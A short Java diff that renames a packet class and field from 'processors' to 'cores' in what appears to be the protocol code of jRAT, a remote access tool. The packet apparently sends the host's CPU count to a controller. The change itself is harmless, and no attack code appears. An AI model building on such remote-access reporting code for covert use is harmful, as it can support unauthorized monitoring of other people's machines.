@@ -5,17 +5,17 @@ import java.io.DataOutputStream;
 import se.jrat.common.io.StringWriter;
 
 
-public class Packet64InitAvailableProcessors extends AbstractOutgoingPacket {
+public class Packet64InitAvailableCores extends AbstractOutgoingPacket {
 
-	private int processors;
+	private int cores;
 
-	public Packet64InitAvailableProcessors(int processors) {
-		this.processors = processors;
+	public Packet64InitAvailableCores(int cores) {
+		this.cores = cores;
 	}
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		dos.writeShort(processors);
+		dos.writeShort(cores);
 	}
 
 	@Override
